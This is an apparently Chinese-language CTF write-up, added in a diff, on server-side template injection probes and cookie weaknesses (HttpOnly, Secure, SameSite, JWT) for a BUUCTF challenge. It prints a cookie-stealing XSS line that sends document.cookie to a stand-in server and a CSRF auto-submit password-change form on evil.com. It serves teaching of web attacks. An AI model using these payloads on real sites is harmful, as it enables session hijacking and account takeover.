@@ -1,0 +1,38 @@
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>做了一道BUUCTF题，接触了许多新的知识点。在这里记录一下<br>题目在这：</p>
+<blockquote>
+<p>👉 <a href="https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable">BJDCTF2020 题目链接</a></p>
+</blockquote>
+<h2 id="1-SSTI"><a href="#1-SSTI" class="headerlink" title="1.SSTI"></a>1.SSTI</h2><p>SSTI是这道题所考察的知识点，所以写在最前面  </p>
+<h3 id="如何判断是SSTI"><a href="#如何判断是SSTI" class="headerlink" title="如何判断是SSTI"></a>如何判断是SSTI</h3><p>众所周知，SSTI是利用服务器模板漏洞，在模板引擎中注入恶意代码来进行攻击。<br>所以我们可以通过输入一些特殊的“探针”，观察服务器响应的变化来判断是否存在SSTI<br>常见的SSTI探针：</p>
+
+    {{7*7}}               # Jinja2, Nunjucks, Twig等
+    ${7*7}                # JSP, Freemarker, Spring
+    <%= 7 * 7 %>          # EJS (Embedded JavaScript)
+    #{7*7}                # Thymeleaf
+
+<p>我们可以在输入框、URL参数、HTTP头、Cookies等位置尝试输入这些探针。然后查看页面返回里有没有49，如果有49，说明这里执行成功了，则存在SSTI漏洞  </p>
+<p>不同的模板中使用不同的注入格式</p>
+<ul>
+<li><strong>Jinja2 和 Twig</strong>: 使用 <code>&#123;&#123; &#125;&#125;</code></li>
+<li><strong>Freemarker 和 Spring</strong>: 使用 <code>$&#123; &#125;</code></li>
+<li><strong>EJS</strong>: 使用 <code>&lt;%= %&gt;</code></li>
+<li><strong>Thymeleaf</strong>: 使用 <code>#&#123; &#125;</code><br>有时候会对大括号之类的进行过滤，所以可以用Unicode进行绕过</li>
+</ul>
+<blockquote>
+<p>👉 <a href="https://forum.butian.net/share/1371">SSTI 利用的文章</a></p>
+</blockquote>
+<h2 id="2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"><a href="#2-这道题提示查看Cookie，看看能从Cookie中突破的还有什么？" class="headerlink" title="2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？"></a>2.这道题提示查看Cookie，看看能从Cookie中突破的还有什么？</h2><p>Cookie可以从以下方面入手<br>1.HttpOnly、Secure、SameSite 标志：如果Cookie没有设置这些标志，可能可以通过XSS攻击窃取Cookie。<br>2.弱JWT签名：如果JWT使用弱的对称加密密钥（如 secret）或无签名 (none algorithm)，可以直接伪造JWT。<br>3.客户端验证：CTF中常见的“role&#x3D;guest”→“role&#x3D;admin”权限提升。<br>4.会话固定 (Session Fixation)：如果你能控制Session ID，可能可以冒充管理员。  </p>
+<p>这里详细写一下第一点和第二点  </p>
+<p>一、HttpOnly、Secure、SameSite 标志<br>我们可以使用F12打开控制台，然后在应用程序 (Application)”→“存储 (Storage)”→“Cookies”中，检查Cookie的属性：</p>
+<pre><code>HttpOnly：如果未启用，可能可以通过XSS攻击来窃取Cookie。
+Secure：如果未启用，可能会在HTTP而不是HTTPS上传输Cookie。
+SameSite：如果为None，可能可用于CSRF攻击。  
+</code></pre>
+<h4 id="1-利用-HttpOnly"><a href="#1-利用-HttpOnly" class="headerlink" title="1. 利用 HttpOnly"></a>1. 利用 HttpOnly</h4><p>开启HttpOnly则禁止通过JavaScript访问Cookie  如果这里是关的，那就可以  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;http://yourserver.com/steal?cookie=&#x27; + document.cookie);&lt;/script&gt;    </span><br></pre></td></tr></table></figure>
+<p>通过钓鱼的方式来获取管理员的会话ID  </p>
+<h4 id="2-利用未设置-Secure-的-Cookie"><a href="#2-利用未设置-Secure-的-Cookie" class="headerlink" title="2. 利用未设置 Secure 的 Cookie"></a>2. 利用未设置 Secure 的 Cookie</h4><p>使用Burp Suite或Wireshark进行抓包。<br>在HTTP请求中，寻找Cookie: PHPSESSID&#x3D;xxxx。<br>如果会话ID出现在HTTP请求中，而不是HTTPS中，则可以劫持会话。<br>如果题目考察是中间人攻击 (MITM)，你可以使用Wireshark来捕获Cookie：<br>过滤器：http.cookie。<br>查找“Set-Cookie”或“Cookie”字段中的会话ID。 </p>
+<h4 id="3-利用不安全的-SameSite-属性"><a href="#3-利用不安全的-SameSite-属性" class="headerlink" title="3. 利用不安全的 SameSite 属性"></a>3. 利用不安全的 SameSite 属性</h4><p>如果SameSite标志为None，则跨站请求可以携带会话ID。<br>这使得CSRF攻击成为可能。<br>在攻击者的网站（比如 http:&#x2F; &#x2F;evil.com）上放置以下表单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http ://victim.com/change_password.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;newpassword123&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>如果受害者访问evil. com，表单会在受害者的会话中自动提交。</p>
+<p>如果SameSite&#x3D;None，浏览器会将受害者的会话ID (PHPSESSID) 自动携带到请求中，管理员的身份将被利用。</p>
